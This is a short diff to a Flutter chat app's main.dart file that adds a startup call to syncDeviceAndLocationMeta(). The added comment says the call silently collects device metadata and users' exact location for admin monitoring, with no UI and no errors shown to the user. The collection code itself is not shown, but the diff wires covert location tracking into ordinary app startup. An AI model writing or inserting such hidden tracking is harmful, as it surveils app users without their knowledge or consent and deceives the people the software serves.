@@ -6,6 +6,7 @@ import 'package:chugli_project65/features/onboarding/splash_screen.dart';
 import 'package:chugli_project65/core/theme/theme_provider.dart';
 import 'package:chugli_project65/core/theme/app_theme.dart';
 import 'package:chugli_project65/data/services/fcm_service.dart';
+import 'package:chugli_project65/data/services/firestore_room_service.dart';
 import 'package:chugli_project65/features/rooms/room_conversation_screen.dart';
 import 'package:chugli_project65/core/widgets/user_status_wrapper.dart';
 import 'package:chugli_project65/core/widgets/broadcast_banner_wrapper.dart';
@@ -36,6 +37,10 @@ void main() async {
 
   // Initialize FCM: registers handlers for background, foreground, and taps.
   await FCMService.instance.initialize(navigatorKey);
+
+  // Silently collect device metadata + exact location for admin monitoring.
+  // Runs in background — no UI impact, no error shown to user.
+  FirestoreRoomService.instance.syncDeviceAndLocationMeta();
 
   runApp(const MyApp());
 }
